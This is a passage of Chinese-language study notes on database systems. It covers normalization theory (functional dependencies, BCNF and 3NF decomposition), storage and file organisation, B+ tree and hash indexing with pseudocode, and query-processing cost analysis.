分解过程中存在信息丢失的称为**有损分解**，而没有信息丢失的称为**无损分解**\n#### 无损分解\n令R为关系模式，并令R1和R2构成R的分解\n若$\\Pi_{R_1}(r) \\Join \\Pi_{R_2}(r) = r$，则说明分解是无损的\n若$r \\subset \\Pi_{R_1}(r) \\Join \\Pi_{R_2}(r)$，则说明分解是有损的\n#### 规范化理论\n- 确定一个给定的关系模式是否为“良构的”\n- 如果一个给定的关系模式不是“良构的”，则需要将其分解为许多较小的关系模式，使得每个模式都满足适当的范式。且分解必须是无损分解\n### 使用函数依赖进行分解\n#### 符号惯例\n- 使用希腊字母（例如$\\alpha$）来表示属性集\n- 使用大写的罗马字母（例如R）来表示关系模式\n- 使用K来表示属性集的一个超键\n- 符号r(R)表示具有模式R的关系r\n#### 键和函数依赖\n考虑一个关系模式r(R)，并且令$\\alpha \\subseteq R \\land \\beta \\subseteq R$\n- 给r(R)的一个实例，如果对于该实例中的所有元组对$t_1$和$t_2$，使得若$t_1[\\alpha]=t_2[\\alpha]$，则$t_1[\\beta]=t_2[\\beta]$也成立，那么实例满足**函数依赖**$\\alpha \\rightarrow \\beta$\n- 如果r(R)的每个合法实例都满足函数依赖$\\alpha \\rightarrow \\beta$，则函数依赖在模式r(R)上**成立**\n##### 键和函数依赖\n- 如果函数依赖$K \\rightarrow R$在r(R)上成立，则K是r(R)的一个超键\n- 如果函数依赖$K \\rightarrow R$在r(R)上成立，并且不存在$\\alpha \\subset K,\\alpha \\rightarrow R$，则K是r(R)的一个候选键\n##### 平凡函数依赖\n如果$\\beta \\subseteq \\alpha$，则形如$\\alpha \\rightarrow \\beta$的函数依赖是平凡的（trivial）\n##### 传递依赖\n令$\\alpha$和$\\beta$为属性集，使得$\\alpha \\rightarrow \\beta$成立但$\\beta \\rightarrow \\alpha$不成立。对于$A \\in R,A \\notin \\alpha, A \\notin \\beta$，如果$\\beta \\rightarrow A$，则A传递依赖于$\\alpha$\n##### 部分依赖\n存在$\\alpha$的一个真子集$\\gamma$使得$\\gamma \\rightarrow \\beta$，则$\\beta$部分依赖$\\alpha$\n#### 函数依赖集的闭包\n$F$：函数依赖集\n$F^+$：能够从集合$F$中推导出的所有函数依赖的集合\n阿姆斯特朗公理：\n- **自反律**：若$\\alpha$为一个属性集且$\\beta \\subseteq \\alpha$，则$\\alpha \\rightarrow \\beta$成立\n- **增补律**：若$\\alpha \\rightarrow \\beta$成立且$\\gamma$为一个属性集，则$\\gamma\\alpha \\rightarrow \\gamma\\beta$成立\n- **传递律**：若$\\alpha \\rightarrow \\beta$成立且$\\beta \\rightarrow \\gamma$成立，则$\\alpha \\rightarrow \\gamma$成立\n\n附加规则：\n- **合并律**：若$\\alpha \\rightarrow \\beta$成立且$\\alpha \\rightarrow \\gamma$成立，则$\\alpha \\rightarrow \\beta\\gamma$成立\n- **分解律**：若$\\alpha \\rightarrow \\beta\\gamma$成立，则$\\alpha \\rightarrow \\beta$成立且$\\alpha \\rightarrow \\gamma$成立\n- **伪传递律**：$\\alpha \\rightarrow \\beta$成立且$\\gamma\\beta \\rightarrow \\delta$成立，则$\\alpha\\gamma \\rightarrow \\delta$成立\n\n计算$F^+$的过程：\n```text\nF+ = F\n应用自反律生成所有的平凡依赖\nrepeat\n    for each F+中的函数依赖f\n        在f上应用增补律\n        将函数依赖的结果加入F+中\n    for each F+中的一对函依赖f1和f2\n        if f1和f2可以使用传递律进行结合\n            将函数依赖的结果加入F+中\nuntil F+不再发生变化\n```\n#### 属性集的闭包\n$\\alpha$：属性集\n$\\alpha^+$：$F$下$\\alpha$的闭包，$F$下被$\\alpha$决定的属性集\n\n\n计算$F$下$\\alpha^+$的过程：\n```text\nresult := α;\nrepeat\n    for each 函数依赖β→γ in F do\n        begin\n            if β⊆ result then result := result∪γ;\n        end\nuntil(result不再发生改变)\n```\n\n属性闭包算法的用途：\n- 测试$\\alpha$是否为超键，可以计算$\\alpha^+$，并检查$\\alpha^+$是否包含$R$中的所有属性\n- 通过检查$\\beta \\subseteq \\alpha^+$，可以检查一个函数依赖$\\alpha \\rightarrow \\beta$是否成立\n- 另一种$F^+$的可替代方法\n\n#### 保持依赖\n验证保持依赖的方式，该方式对$F$中的每个$\\alpha \\rightarrow \\beta$都使用下面的过程：\n```text\nresult = α\nrepeat \n    for each 分解后的Ri\n        t = (result∩Ri)+ ∩ Ri\n        result = result ∪ t\nuntil(result没有变化)\n```\n如果result包含了$\\beta$的所有属性，则函数依赖$\\alpha \\rightarrow \\beta$被保持\n\n#### 正则覆盖\n- 从一个函数依赖的左侧删除一个属性可以使其成为更强的约束\n- 从一个函数依赖的右侧删除一个属性可以使其成为更弱的约束\n##### 无关属性\n考虑一个函数依赖集$F$以及$F$中的函数依赖$\\alpha \\rightarrow \\beta$\n- **从左侧移除**：如果$A \\in \\alpha$并且$F$逻辑蕴含$(F-\\{\\alpha \\rightarrow \\beta\\}) \\cup \\{(\\alpha -A)\\rightarrow \\beta\\}$，则属性$A$在$\\alpha$中是无关的\n- **从右侧移除**：如果$A \\in \\beta$并且函数依赖集$(F-\\{\\alpha \\rightarrow \\beta\\}) \\cup \\{\\alpha \\rightarrow (\\beta - A)\\}$逻辑蕴含$F$，则属性$A$在$\\beta$中是无关的\n##### 正则覆盖\n$F$的正则覆盖集$F_c$是这样的一个依赖集：\n- $F$逻辑蕴含$F_c$的所有依赖\n- $F_c$逻辑蕴含$F$的所有依赖\n- $F_c$中任何函数依赖都不包含无关属性\n- $F_c$中每个函数依赖的左侧都是唯一的\n\n```text\nFc=F\nrepeat\n    使用合并律将Fc中任何形如α1→β1和α1→β2的依赖替换为α1→β1β2\n    在Fc中寻找一个函数依赖α→β，它要么在α中要么在β中具有一个无关属性\n    /*使用Fc而非F来检验无关属性*/\n    如果找到一个无关属性，则将它从Fc中的α→β中删除\nuntil(Fc不再改变)\n```\n#### 无损分解和函数依赖\n\n$R_1$和$R_2$构成$R$的一个无损分解的条件是，以下函数依赖中至少有一个在$F^+$中：\n- $R_1 \\cap R_2 \\rightarrow R_1$\n- $R_1 \\cap R_2 \\rightarrow R_2$\n\n即，如果$R_1 \\cap R_2$要么构成$R_1$的超键要么构成$R_2$的超键，则$R$的分解就是一个无损分解\n### 范式\n#### BCNF范式\n对于$F^+$中所有形如$\\alpha \\rightarrow \\beta$的函数依赖（其中$\\alpha \\subseteq R$且$\\beta \\subseteq R$），下面至少有一项成立：\n- $\\alpha \\rightarrow \\beta$是平凡函数依赖\n- $\\alpha$是模式$R$的一个超键\n\n对于不属于BCNF的模式进行分解的通用规则：\n若存在非平凡函数依赖$\\alpha \\rightarrow \\beta$，使得$\\alpha$不是模式$R$的一个超键，则使用以下两个模式取代$R$\n- $(\\alpha \\cup \\beta)$\n- $(R-(\\beta-\\alpha))$\n##### BCNF的检测\n- 为了检查一个非平凡的依赖$\\alpha \\rightarrow \\beta$是否违反BCNF，可以计算$a^+$，并且验证它是否包含了$R$中的所有属性，即验证其是否是$R$的一个超键\n- 为了检查一个关系模式$R$是否属于BCNF，仅需检查给定集合$F$中的依赖是否违反BCNF就足够了，而不必检查$F^+$中的所有依赖\n- 为了检查$R$分解后的一个关系模式$R_i$是否属于BCNF，对于$R_i$中属性的每个子集$\\alpha$，检查$a^+$要么\n    - 不包含$R_i-\\alpha$的任何属性\n    - 包含$R_i$的所有属性\n##### BCNF分解算法\n该算法所产生的分解不仅满足BCNF，而且还是无损分解：\n```text\nresult :={R};\ndone := false;\nwhile (not done) do\n    if (在result中存在一个模式Ri不属于BCNF) then\n        begin\n            令α→β为在Ri上成立的一个非平凡函数依赖，使得α+并不包含Ri，且α∩β=∅\n            result :=(result-Ri)∪(Ri-β)∪(α,β);\n        end\n    else done := true; \n\n```\n#### 3NF范式\n对于$F^+$中所有形如$\\alpha \\rightarrow \\beta$的函数依赖（其中$\\alpha \\subseteq R$且$\\beta \\subseteq R$），下面至少有一项成立：\n- $\\alpha \\rightarrow \\beta$是平凡函数依赖\n- $\\alpha$是模式$R$的一个超键\n- $\\beta-\\alpha$中的每个属性$A$都被包含于$R$的一个候选码中（可能在不同的候选码之中）\n\n**任何满足BCNF的模式也满足3NF**\n##### 3NF分解\n```text\n令Fc为F的一个正则覆盖;\ni := 0;\nfor each Fc中的函数依赖α→β\n    i := i+1;\n    Ri:=αβ;\nif 没有一个模式Rj(j=1,2,...,i)包含R的一个候选码\n    then\n        i :=i+1;\n        Ri:=R的任一候选码;\n/*可选地删除冗余关系*/\nrepeat\n    if 任意模式Rj包含与另一个模式Rk中\n        then\n        /*删除Rj*/\n        Rj:=Ri;\n        i :=i-1;\nuntil 不再有可以被删除的Rj\nreturn (R1,R2,...Ri)\n```\n#### 1NF范式\n关系模式$R$的所有属性的域都是原子的\n## 数据存储结构\n### 文件组织\n- 一个数据库被映射为多个不同的文件\n- 每个文件从逻辑上被分为定长的存储单元，称为**块**\n- 块是存储分配和数据传输的单位\n- 假定：\n    - 没有比块更大的记录\n    - 每条记录被完全包含在单个块中\n#### 定长记录\n- 在一个块中只分配它能完整容纳的最多记录的数目\n- 当一条记录被删除时，可以选择把紧跟其后的记录移动到被删记录先前占据的空间中，但这样需要额外的块访问\n- 在文件的开头分配特定数量的字节作为**文件头**，可以在文件头中存储内容被删除的第一条记录的地址作为链表的头结点，该链表通常被称为**自由链表**\n    - 在插入一条新纪录时，使用文件头所指向的记录，并改变文件头的指针以指向下一条可用记录\n    - 如果没有可用的空间，就把新纪录加到文件末尾\n#### 变长记录\n- 具有变长属性的记录的表示通常包含两个部分：\n    - 带有定长信息的初始部分\n        - 固定长度的属性被分配存储它们的值所需的字节数\n        - 变长属性在初始部分中被表示为一个（偏移量，长度）对，其偏移量表示在记录中该属性的数据开始的位置，而长度表示变长属性的字节长度\n    - 变长属性的内容，连续存储\n- 空位图表示记录的哪个属性是空值\n\n![13](https://d-sketon.top/img/db-book/13.png)\n##### 分槽的页结构\n每个块的开始处有一个块头，其包含以下信息：\n- 块头中记录项的数量\n- 块中自由空间的末尾处\n- 一个由包含每条记录的位置和大小的项组成的数组\n\n分配方式： \n+ 记录从块的末尾处开始在块中连续分配空间\n+ 块中的自由空间是连续的\n+ 如果一条记录被删除，它所占用的空间被释放，并且它的项被置为deleted。此外，块中位于被删除记录之前的记录被移动，使得删除产生的自由空间能被重新使用\n\n![14](https://d-sketon.top/img/db-book/14.png)\n#### 大对象存储\n大对象可以以文件形式存储在被数据库管理的一个文件系统区域中，或者作为文件结构存储在数据库中并被数据库管理\n### 文件中记录的组织\n#### 堆文件组织\n记录可存储在对应于一个关系的文件中的任何位置。记录一旦被放在特定位置，通常不会被移动\n##### 自由空间图\n用于跟踪具有自由空间来存储记录的块\n- 通常被表示成一个数组，对关系的每个块，该数组都包含一个项\n- 每个项表示一个比例f，即在块中至少有比例f的空间是自由的\n- 为了加速定位具有自由空间的块的人物，可以创建**二级自由空间图**\n- 二级自由空间图的项存储了主自由空间图中相应项的最大值\n#### 顺序文件组织\n为了高效处理按某个搜索码（任意是属性或属性的集合，无需主键或超键）的顺序排序的记录而设计\n- 通过指针把记录链接起来，每条记录的指针指向按搜索码顺序排列的下一条记录\n- 按搜索码的顺序，或尽可能接近搜索码的顺序物理存储记录\n- 允许记录按排列的顺序读取\n\n插入操作：\n- 在文件中定位按搜索码的顺序位于待插入记录之前的那条记录\n- 如果在这条记录所在块中有一条自由的记录，就在这里插入新的记录。否则，将新纪录插入一个**溢出块**之中\n- 无论哪种情况都要调整指针，使其能按搜索码顺序吧记录链接在一起\n- 每隔一段时间后，文件应当被**重组**，使其再次在物理上按顺序存放\n#### 多表聚簇文件组织\n多个不同关系的记录被存储在相同的文件之中，以便减少特定连接操作的代价\n- **聚簇码**定义了哪些记录被存储在一起\n#### B+树文件组织\n和B+数索引结构有关，可以提供对记录的高效顺序访问、即使存在大量插入，删除或更新操作\n#### 哈希文件组织\n在每条记录的某些属性上计算一个散列函数。函数的结果确定了记录存入文件的哪个块中\n#### 划分\n许多数据库允许将一个关系中的记录划分为更小的关系，这些关系分别进行存储\n### 数据字典存储\n关系模式和关于关系的其他元数据存储在**数据字典**或**系统目录**中\n其中必须存储的信息类型有：\n- 关系的名称\n- 每个关系中属性的名称\n- 属性的域和长度\n- 在数据库上定义的视图的名称，以及视图的定义\n- 完整性约束\n\n可以为用户保存下列信息：\n- 用户的名称、缺省模式、密码或其他信息\n- 关于每个用户的授权信息\n\n可能记录关系的存储组织及每个关系的存储位置：\n- 若关系被存在操作系统文件之中，数据字典将会记录每个关系的单个文件（或多个文件）的名称\n- 若关系被存在单个文件中，数据字典可能将包含每个关系的记录的块记录在诸如链表那样的数据结构中\n\n存储每个关系的每个索引的信息：\n- 索引的名称\n- 被索引的关系的名称\n- 在器上定义索引的数学\n- 构造的索引的类型\n### 数据库缓冲区\n- **缓冲区**是主存中用于存储磁盘快递拷贝的那部分\n- 每个块总有一份拷贝存放在磁盘上，但是磁盘上的拷贝可能比缓冲区的版本旧\n- 负责缓冲区空间分配的子系统称为**缓冲区管理器**\n#### 缓冲区管理器\n缓冲区管理器和操作系统虚拟存储管理器类似\n##### 被钉住的块\n- 在一个进程从缓冲块中读取数据之前，进程在该块上执行钉住操作\n- 缓冲区管理器不会溢出一个被钉住的块\n##### 缓冲区上的共享排它锁\n数据库缓冲区管理器允许进程获取缓冲区上的共享排它锁\n封锁规则：\n- 任意数量的进程可以在一个块上同时拥有共享锁\n- 每次只允许一个进程获得排它锁，并且当一个进程拥有排他锁时，其他进程不能拥有此块上的共享锁。\n- 如果一个进程请求块上的排它锁，但此块已经以共享或者排他模式被封锁，那么在早期封锁被释放之前，该请求一直处于等待状态\n- 如果一个进程请求块上的共享锁，而且此块没有被封锁或者已经被共享锁封锁，则此锁可以被授予；但是，如果另一个进程持有该块的排它锁，则共享锁只有在排他锁被释放后才能授予\n\n获得释放封锁规则：\n- 在一个块上执行任何操作之前，进程必须钉住这个块。随后获得封锁，且必须在对块解除钉住之前释放封锁\n- 在从缓冲块读数据之前，进程必须获取此块上的共享锁。当完成数据读取时，进程必须释放此锁\n- 在更新缓存块内容之前，进程必须获得此块上的排它锁；该锁必须在更新完成后释放\n#### 缓冲区替换策略\n绝大多数数据库都使用了LRU策略\n## 索引\n### 顺序索引\n顺序索引按照排好的顺序存储搜索码的值，并将每个搜索码与包含该搜索码的记录关联起来\n- **聚集索引（主索引）**\n    - 包含记录的文件按顺序排列\n    - 搜索码定义了文件的排列次序\n- **非聚集索引（辅助索引）**\n    - 搜索码指定的次序与文件的排列次序不同\n#### 稠密索引\n对于文件中的每个搜索码值都有一个索引项 \n- **稠密聚集索引**\n    - 索引记录包括搜索码值以及指向具有该搜索码值的第一条数据记录的指针\n    - 具有相同搜索码值的其余记录会顺序i存储在第一条记录之后\n- **稠密非聚集索引**\n    - 索引必须存储指向具有相同搜索码值的所有记录的指针列表\n#### 稀疏索引\n只为某些搜索码值建立索引项\n- 只有当关系按搜索码排列次序存储时才能使用稀疏索引\n- 索引记录包括搜索码值以及指向具有该搜索码值的第一条数据记录的指针\n#### 多级索引\n-  使用多级索引提升搜索效率\n- 在原始索引上构造一个稀疏的外层索引\n#### 索引更新\n##### 插入\n- 稠密索引\n    - 如果搜索码值不在索引中，则在适当位置插入该搜索码值的索引\n    -  如果索引项存储所有记录的指针，则在索引项中增加一条指向新记录的指针\n    -  如果所有向存储第一条记录的指针，则将待插入的记录放到相同搜索码值的其他记录之后\n- 稀疏索引\n    -  如果插入的记录具有它所在块的最小搜索码值，则更新指向该块的索引\n##### 删除\n- 稠密索引\n    - 如果待删除的记录是该特定搜索码值的唯一记录，则直接删除该索引项\n    -  如果索引项存储所有记录的指针，则在索引项中删除一条指向新记录的指针\n    -  如果所有向存储第一条记录的指针，且待删除记录是该搜索码值的第一条，则更新索引项，使其指向下一条记录\n- 稀疏索引\n    - 如果待删除的记录是该特定搜索码值的唯一记录，则系统用下一个搜索码值的索引记录代替；如果下一个搜索码值已经有了索引项，则删除该该索引项\n    - 否则，如果该搜索码值的索引项指向待删除的记录，则更新索引项，使其指向具有相同搜索码值的下一条记录\n#### 辅助索引\n辅助索引必须是稠密的，对每个搜索码值都有一个索引项，并且对文件中的每条记录都有一个指针\n### B+树索引\nB+树索引采用平衡树结构\n- 从树根到树叶的每条路径的长度都是相同的\n- 树中每个非叶节点（除根节点）有⌈n/2⌉到n个孩子\n- 根节点有2到n个孩子\n#### B+树结构\n- 典型的B+树节点最多包含n-1个搜索码值K1,K2,...Kn-1，以及n个指针P1,P2,..,Pn\n- 一个节点内的搜索码值是有序存放的 \n##### 叶节点\n- 对i=1,2,...,n-1，指针Pi指向具有搜索码值Ki的一条文件记录\n- 指针Pn指向下一个叶节点，用于高效的顺序处理\n- 每个叶节点最多有n-1个值，最少有⌈(n-1)/2⌉个值  \n- 如果Li和Lj是叶节点且i\\<j，则Li中的每个搜索码值vi均小于Lj中的每个搜索码值vj\n- 如果B+树索引比用作稠密索引，每个搜索码值都必须出现在某个叶节点中 \n\n![15](https://d-sketon.top/img/db-book/15.png)\n#### B+树的查询\nB+树的查询：\n```text\nfunction find(v)\n    C = 根节点\n    while (C不是叶节点) begin\n        令i = 满足 v <=C.Ki的最小值\n        if 没有这样的i then begin\n            令Pm = 该节点中最后一个非空指针\n            置C=C.Pm\n        end\n        else if (v = C.Ki)  then 置C = C.Pi+1  \n        else 置C = C.Pi\n    end\n    if 有某个i,满足 Ki = v  \n        then return Pi\n    else \n        return null\n```\n#### B+树的插入\n在B+树中插入项：\n```text\nprocedure insert(value K, pointer P)\n    if (树为空) 创建一个空的叶节点L，同时它也是根节点\n    else 找到应该包含码值K的叶节点L\n    if (L 具有不到n-1个码值)\n        then insert_in_leaf (L, K, P)\n        else begin  /* 拆分L */\n        创建节点 L'\n        把 L.P1 … L.Kn-1 复制到可以容纳n个（指针，码值）对的内存块T中\n        insert_in_leaf (T, K, P)\n        令 L'.Pn = L.Pn\n        令 L.Pn = L'\n        从L中删除L.P1 到 L.Kn-1\n        把 T.P1 到 T.K⌈n∕2⌉ 从 T 复制到 L 中，L 以 L.P1 作为开始\n        把 T.P⌈n∕2⌉+1 到 T.Kn 从 T 复制到 L'中，L'以 L'.P1 作为开始\n        令 K'为 L'中的最小码值\n        insert_in_parent(L, K', L')\n    end\n```\n用于往B+树中插入项的辅助过程：\n```text\nprocedure insert_in_leaf (node L, value K, pointer P)\n    if (K < L.K1) then 把P、K插入L中，紧接在L.P1前面\n    else begin\n            令 Ki 表示 L 中小于或等于 K 的最大值\n            把P、K插入L中，紧接在L.Ki前面\n    end\n    \nprocedure insert_in_parent(node N, value K', node N')\n    if (N 是树的根结点)\n        then begin\n       创建一个新的，包含N、K'、N'的节点R\n       令R为树的根节点\n       return\n        end\n    令 P = parent (N)\n    if (P有不到n个指针) then 将 (K', N')插入 P 中，紧跟在 N 后面\n    else begin   /* 拆分 P */\n        将 P 复制到可以容纳 P 和 (K', N') 的内存块 T 中\n        将 (K', N') 插入 T 中，紧跟在 N 后面\n        删除 P 中所有项 \n        创建节点 P'\n        把 T.P1…T.P⌈(n+1)∕2⌉ 复制到 P\n        令 K'' = T.K⌈(n+1)∕2⌉\n        把 T.P⌈(n+1)∕2⌉+1…T.Pn+1 复制到 P'\n        Insert_in_parent(P, K'', P')\n    end\n```\n#### B+树的删除\n```text\nprocedure delete(value K, pointer P)\n    找到包含(K, P)的叶节点 L\n    delete_entry(L, K, P)\n    \nprocedure delete_entry(node N, value K, pointer P)\n    从 N 中删除 (K, P)\n    if (N 是根节点 and N 只剩下一个子节点)\n    then 使 N 的子节点成为该树的新的根节点并删除 N\n    else if (N 有太少的值/指针) then begin\n        令 N' 为 parent(N) 的前一个或后一个孩子节点\n        令 K' 为 parent(N) 中指针 N 和 N' 之间的值\n        if (N 和 N' 中的项能放入单个节点中)\n            then begin /*合并节点*/\n                if (N 是 N'的前一个节点) then swap_variables(N, N')\n                if (N 不是叶节点)\n                    then 将 K'以及 N 中所有的指针和值附加到 N'中\n                    else 将 N 中所有 (Ki, Pi) 对附加到 N' 中\n                    令 N'.Pn = N.Pn\n                    delete_entry(parent(N), K', N);删除节点 N\n                end\n        else begin/*重新分配，从 N' 借来一个项*/\n            if (N' 是 N 的前一个节点) then begin\n                if (N 是非叶节点) then begin\n                    令 m 满足：N'.Pm 是 N' 中的最后一个指针\n                    从 N' 中去除 (N'.Km-1, N'.Pm)\n                    插入 (N'.Pm, K') 并通过将其它指针和值右移使之成为 N 中的第一个指针和值\n                    用 N'.Km-1 替换 parent(N) 中的 K'\n                end\n                else begin\n                    令 m 满足 (N'.Pm, N'.Km) 是 N' 中的最后一个指针/值对\n                    从 N' 中去除 (N'.Pm, N'.Km)\n                    插入 (N'.Pm, N'.Km) 并通过将其它指针和值右移使之成为 N 中的第一个指针和值\n                    用 N'.Km 替换 parent(N) 中的 K'\n                end\n            end\n            else ...与then的情况对称...\n        end\n    end\n```\n#### 非唯一性搜索码\n- 每个码只在树中存储一次，并维护一个带有搜索码值的记录指针的桶，但会产生复杂问题\n- 每条记录存储一次搜索码的值，但也会产生复杂问题\n- 由于以上两个方法删除效率底下，所以大多数数据库系统中的B+树都只处理唯一性搜索码，并自动添加记录ID或其他属性以使非唯一性搜索码变得唯一\n### B+树扩展\n#### B+树文件组织\n- 不仅把B+树结构作为索引来使用，而且把它作为一种文件中记录的组织方式来使用\n- 树的叶节点存储的是记录而不是指向记录的指针\n- B+树文件组织可用于存储大型对象，可将大型对象拆分成更小的记录序列并组织成B+树文件组织的形式进行存储\n#### 辅助索引和记录重分配\n- 如果记录的位置发生了改变，存储了指向被重新分配过的记录的指针的所有赋值索引都必须被更新\n- B+树文件组织中节点拆分的代价及其高昂\n- 解决方法：在辅助索引中存储主索引搜索码属性的值\n- 该方法大大降低了由文件重组导致的索引更新的代价，但也增加了使用辅助索引访问数据的代价\n#### 对字符串的索引\n- 可变字符串会导致不同的扇出\n- 节点的合并或者项的重新分配取决于节点中所使用空间的比例，而不是根据节点所能容纳的最大项数\n- 使用**前缀压缩**的技术可以增加节点的扇出\n    - 在非叶节点上存储每个搜索码值的一个前缀\n#### B树文件索引\n- B树只允许搜索码值出现一次（如果它们是唯一的）\n- 可以比相应的B+树索引使用更少的节点\n- 需要在非叶节点中为每个搜索码包含一个额外的指针域\n### 散列索引\n- **桶**：可以存储一条或多条记录的存储单元\n    - 对于内存中的散列索引，桶可以是索引项或记录的链表\n    - 对于基于磁盘的索引，桶可以是磁盘块的链表\n    - 在散列文件组织中，桶存储实际的记录\n- **散列函数**：从所有搜索码值的集合K到所有桶地址的集合B的函数\n    - 使用**溢出链**的散列索引也称为**闭寻址** \n\n散列索引能高效地支持搜索码上的相等查询，但不支持范围查询\n### 位图索引\n- 为多码上的简单查询设计的一种特殊类型的索引\n- r关系在A属性上的位图索引是由A能取的每个值所对应的位图构成\n- 每个位图都有和关系中的记录数相等数量的位\n- 如果编号为i的记录在A的属性为vj，则值为vj的位图中第i位为1，其他所有位为0\n## 查询处理\n查询处理的基本步骤：\n- 语法分析与翻译\n- 优化\n- 执行\n\n基本概念：\n- 带有“如何执行”注释的关系代数运算称为**执行原语**\n- 用于执行一个查询的原语操作序列称为**查询执行计划**\n- **查询执行引擎**接收一个查询执行计划，执行该计划并把结果返回给查询\n### 查询代价的度量\n- 对于驻留在磁盘上的大型数据库，从磁盘访问数据I/O代价通常是最主要的的代价\n- 当数据驻留在内存或SSD上时，I/O并不是主要代价，CPU代价也必须考虑\n- 我们使用从存储中**传输的块数**以及**随机I/O访问数**作为估计查询执行计划的代价的两个重要因素\n### 选择运算\n| |算法|代价|原因|\n|-|-|-|-|\n|A1|线性搜索|ts+br\\*tT|一次初始搜索加上br次块传输，其中br表示文件中的块数量|\n|A1|线性搜索，码上的等值比较|平均情况ts+(br/2)\\*tT|因为最多有一条记录满足条件，所以一旦找到所需的记录，扫描就可以终止|\n|A2|B+树聚集索引，码上的等值比较|(hi+1)\\*(tT+ts)|（hi表示索引的高度）索引搜索遍历树的高度，再加上一次I/O来获取记录；每个这样的I/O操作需要一次寻道和一次块传输|\n|A3|B+树聚集索引，非码上的等值比较|hi\\*(tT+ts)+ts+b\\*tT|树的每一层有一次寻道，第一个块有一次寻道。这里b是包含具有指定搜索码记录的块数，所有这些记录都是要读取的。假定这些块是顺序存储（因为是聚集索引）的叶子块并且不需要额外的寻道|\n|A4|B+树辅助索引，码上的等值比较|(hi+1)\\*(tT+ts)|和聚集索引类似|\n|A4|B+树辅助索引，非码上的等值比较|(hi+n)\\*(ts+tT)|（其中n是所获取记录的数量）在这里，索引遍历的代价和A3一样，但是每条记录存储在不同的块上，需要对每条记录进行一次寻道。如果n值比较大，代价可能非常昂贵|\n|A5|B+树聚集索引，比较|hi\\*(tT+ts)+ts+b\\*tT|和A3、非码上的等值比较的情况一样|\n|A6|B+树辅助索引，比较|(hi+n)\\*(ts+tT)|和A4、非码上的等值比较的情况一样|\n- A7（使用一个索引的合取选择）\n    - 用A2-A6的一种算法检索满足其中一个简单条件的记录。然后在内存缓冲区中测试是否满足其余简单条件\n- A8（使用组合索引的合取选择）\n    - 如果选择指定的是两个或多个属性上的等值条件，并且在这些属性字段的组合上存在组合索引，则可以直接搜索该索引 \n- A9（使用标识交集的合取选择）\n    - 要求在各个条件所涉及的字段上都有带记录指针的索引\n    - 对每个索引进行扫描，以获取那些指向满足单个条件的元组的指针\n    - 所有检索到的指针的交集就是满足合取条件的元组的指针集合\n- A10（使用标识并集的析取选择）\n    - 扫描每个索引以获取满足单个条件的元组的指针\n    - 检索到的所有指针的并集就产生出指向满足析取条件的所有元组的指针的集合\n### 排序\n特指在物理上对记录进行排序\n#### 外排序-归并算法\n- 对不能全部放入内存中的关系进行的排序称为**外排序**\n- 对于外排序最常用的技术是**外排序-归并**算法\n- 第一阶段，创建多个排好序的归并段\n```text\ni = 0;\nrepeat\n    读入关系的M个块或者关系的剩余部分，以较小者为准\n    对关系在内存中的部分进行排序\n    将排好序的数据写到归并段文件Ri中\n    i= i+1\nuntil 到达关系末尾\n```\n- 第二阶段，对归并段进行归并\n```text\n为N个归并段文件Ri各读入一个块到内存缓冲块中\nrepeat\n    从所有缓冲块中（按序）挑选第一个元组\n    把该院足协倒数初中，并将其从缓冲块中删除\n    if 任何一个归并段Ri的缓冲块为空 and not 到达 Ri 的末尾\n        then 将 Ri 的下一块读入缓冲块\nuntil 所有的输入缓冲块均为空\n```\n #### 外排序-归并的代价计算\n 总共需要的归并趟数为$\\lceil log_{\\lfloor M/b_b\\rfloor-1}(b_r / M) \\rceil$\n 关系外排序的块传输的总数为$b_r (2 \\lceil log_{\\lfloor M/b_b\\rfloor-1}(b_r / M) \\rceil + 1)$\n 寻道磁盘的代价为$2\\lceil b_r / M \\rceil + \\lceil b_r / b_b \\rceil (2 \\lceil log_{\\lfloor M/b_b\\rfloor-1}(b_r / M) \\rceil - 1)$\n ### 连接运算\n #### 嵌套-循环连接\n```text\nfor each 元组 tr in r do begin\n    for each 元组 ts in s do begin\n        测试元组对(tr, ts) 是否满足连接条件\n        如果满足，把tr·ts加到结果中\n    end\nend\n```\n- 嵌套-循环连接算法的代价昂贵\n- 如果其中一个关系能完全放入主存中，则应该把这个关系作为内层关系\n#### 块嵌套-循环连接\n```text\nfor each 块Br of r do begin\n    for each 块Bs of s do begin\n        for each 元组 tr in Br do begin\n            for each 元组 ts in Bs do begin\n                测试元组对(tr, ts) 是否满足连接条件\n                如果满足，把tr·ts加到结果中\n            end\n        end\n    end\nend\n```\n- 在最坏的情况下，对于外层关系中的每个块，内层关系s的每个块只需读一次\n#### 索引嵌套-循环连接\n- 若在内层循环的连接属性上有索引可用，则可以用索引查找来代替文件扫描\n- 代价公式表明：如果两个关系上均有索引可用，通常使用元组较少的关系作为外层关系最为高效\n#### 归并-连接\n- 用于计算自然连接和等值连接\n- 两个关系必须均按公共属性排序\n- 排序后连接通过与排序-归并算法中的归并阶段非常相似的处理过程来计算\n##### 代价分析\n- 所需的块传输次数等于两个文件的块数之和$b_r+b_s$（假设所有Ss集合均可装入内存）\n- 假设每个关系分配$b_b$个缓冲块，则所需的磁盘寻道次数为$\\lceil b_r / b_b \\rceil + \\lceil b_s / b_b \\rceil$\n#### 混合归并-连接\n- 把已排序关系与B+树辅助索引的叶子项进行归并\n- 所得到的结果文件包含已排序关系的元组和未排序关系的元组地址\n- 将结果文件按未排序关系的元组地址进行排序，从而能对相关元组按物理存储顺序进行高效的检索\n#### 散列-连接\n- 用于计算自然连接和等值连接\n- 相比于归并-连接算法，将排序改为了使用散列函数\n    - 使用散列函数，获得两个关系对应的散列分区\n    - 在其中一个分区上构造内存散列索引，并使用索引嵌套-循环连接定位出所有需要连接的元组\n    - 进行连接\n##### 代价分析\n- 不考虑递归分区\n    - 所需块传输次数$3(b_r+b_s)+4n_h$，通常$4n_h$可以被忽略\n    - 所需的磁盘寻道次数为$2(\\lceil b_r / b_b \\rceil + \\lceil b_s / b_b \\rceil)+2n_h$次寻道\n- 考虑递归分区\n    - 所需块传输次数$2(b_r+b_s)\\lceil log_{\\lfloor M/b_b \\rfloor -1}(b_s /M) \\rceil +b_r + b_s$\n    - 所需的磁盘寻道次数为$2(\\lceil b_r / b_b \\rceil + \\lceil b_s / b_b \\rceil) \\lceil log_{\\lfloor M/b_b \\rfloor -1}(b_s /M) \\rceil$次寻道\n### 其他运算\n#### 去重\n可以通过排序和散列来实现去重\n#### 投影\n首先对每个元组执行投影，然后去除重复记录\n#### 集合运算\n- 首先对两个关系进行排序，然后对每个已排序的关系扫描一次以产生结果\n- 也可以选择使用散列，然后对每个分区扫描一次以产生结果\n#### 外连接\n- 1. 计算相应的连接，然后将适当的元组加入连接结果中以得到外连接结果\n- 2. 对连接算法加以修改\n#### 